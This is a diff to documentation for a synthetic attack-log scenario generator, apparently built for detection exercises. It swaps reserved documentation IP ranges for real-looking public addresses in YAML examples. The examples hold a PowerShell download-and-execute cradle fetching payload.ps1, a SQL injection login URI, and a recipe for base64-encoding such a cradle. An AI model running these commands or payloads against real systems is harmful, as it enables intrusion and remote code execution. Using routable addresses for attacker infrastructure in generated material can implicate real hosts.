@@ -207,7 +207,7 @@ environment:
       members: [marcus.chen]
 
   network:                        # Optional but recommended for realism
-    public_cidrs: ["203.0.113.0/28"]  # Org's public IP block (auto-derived from VIPs if omitted)
+    public_cidrs: ["45.83.220.0/28"]  # Org's lab public IP block (auto-derived from VIPs if omitted)
     segments:
       - name: corporate_lan
         cidr: "10.0.1.0/24"
@@ -239,8 +239,8 @@ environment:
           - {src: server_vlan, dst: external, ports: [80, 443, 53]}
           - {src: server_vlan, dst: server_vlan}
         nat_rules:                # NAT translation rules
-          - {type: dynamic_pat, src: corporate_lan, mapped_ip: "203.0.113.1"}
-          - {type: static, real_ip: "10.10.20.10", mapped_ip: "203.0.113.10"}
+          - {type: dynamic_pat, src: corporate_lan, mapped_ip: "45.83.220.1"}
+          - {type: static, real_ip: "10.10.20.10", mapped_ip: "45.83.220.10"}
 
 personas:                         # Define inline or reference pre-built from personas/
   - name: developer
@@ -257,6 +257,10 @@ time_window:
   duration: "8h"                  # OR use end: "2024-01-15T18:00:00Z"
   warmup: "8h"                    # Optional (default "8h", minimum "1h"). Pre-populates DNS
                                   # cache, process trees, sessions before start.
+
+# Ensure every storyline and red_herring time falls inside time_window. If the
+# last attack step is at +36h, use duration >= "37h" so baseline and signal
+# sources share the same collection horizon.
 
 baseline_activity:
   description: "Normal office activity"
@@ -425,7 +429,7 @@ events:
     command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-assets-update.com/payload.ps1')\""
     technique: "T1059.001 - PowerShell"
   - type: connection               # Pair with connection so domain appears in DNS/SSL/proxy
-    dst_ip: "203.0.113.50"
+    dst_ip: "45.83.221.50"
     dst_port: 443
     hostname: "cdn-assets-update.com"
     service: ssl
@@ -442,7 +446,7 @@ IMPORTANT: When a connection uses a domain name (not a raw IP), set `hostname` o
 ```yaml
 events:
   - type: connection
-    dst_ip: "198.51.100.10"
+    dst_ip: "45.83.221.10"
     dst_port: 443
     hostname: "cdn-assets-update.com"   # Domain for DNS/SSL/proxy
     service: "ssl"
@@ -453,7 +457,7 @@ events:
 ```yaml
 events:
   - type: connection
-    dst_ip: "198.51.100.10"
+    dst_ip: "45.83.221.10"
     dst_port: 80
     service: http
     method: "POST"
@@ -471,7 +475,7 @@ events:
     dst_ip: "10.10.20.10"
     dst_port: 80
     service: http
-    source_ip: "203.0.113.45"
+    source_ip: "104.248.71.33"
     method: "GET"
     uri: "/ehr/login.php?id=1' OR 1=1--"
     status_code: 200
@@ -521,7 +525,7 @@ events:
 
 The validator warns if it detects potentially redundant manual specifications alongside events that would auto-generate them.
 
-Use RFC 5737 documentation IP ranges for external attacker IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems.
+For realism-bound scenarios, do not use RFC 5737 TEST-NET ranges (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) for public NATs, C2, scanners, or attacker infrastructure. Those ranges are safe for documentation snippets, but they are an obvious synthetic-data tell in generated logs. Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems, and use a scenario-owned lab public allocation or generated non-reserved public-looking addresses for external infrastructure.
 
 ### Long Time Windows and Baseline Exercises
 
@@ -535,7 +539,7 @@ When a storyline event includes base64-encoded data, obfuscated commands, or any
 
 For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64):
 ```bash
-echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.45/payload.ps1")' | iconv -t UTF-16LE | base64
+echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://45.83.221.45/payload.ps1")' | iconv -t UTF-16LE | base64
 ```
 
 For plain base64 (Linux commands, general obfuscation):
